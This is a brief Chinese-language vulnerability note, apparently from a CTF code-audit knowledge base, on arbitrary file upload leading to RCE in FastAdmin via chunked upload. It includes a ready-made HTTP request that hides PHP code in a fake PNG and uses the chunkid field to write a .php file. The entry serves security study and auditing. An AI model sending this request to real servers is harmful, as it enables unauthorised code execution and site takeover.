---
title: FastAdmin 远程代码执行漏洞
category: code-audit
tags: [fastadmin, thinkphp, rce, file-upload, chunking]
triggers: [fastadmin, FASTADMIN, uploadurl, 分片上传, chunking, ThinkPHP, ajax/upload]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/code-audit/FastAdmin 远程代码执行漏洞.md]
---

## Summary

FastAdmin 框架存在有条件 RCE，攻击者具有普通用户权限时可利用分片上传功能实现任意文件上传。

## Details

### 前提

1. 需要普通用户权限（可注册）
2. 需要开启分片上传（`application/extra/upload.php` 中 `chunking` 为 `true`）

### 利用

```http
POST /index/ajax/upload HTTP/1.1
Host: target

Content-Disposition: form-data; name="file"; filename="Xnip2021-04-02_11-05-27.png"
Content-Type: application/octet-stream

PNG
...
<?php phpinfo();?>

Content-Disposition: form-data; name="chunkid"
xx.php
```

## Connections

- GHSA: [[code-audit/ghsa-rce-patterns]]
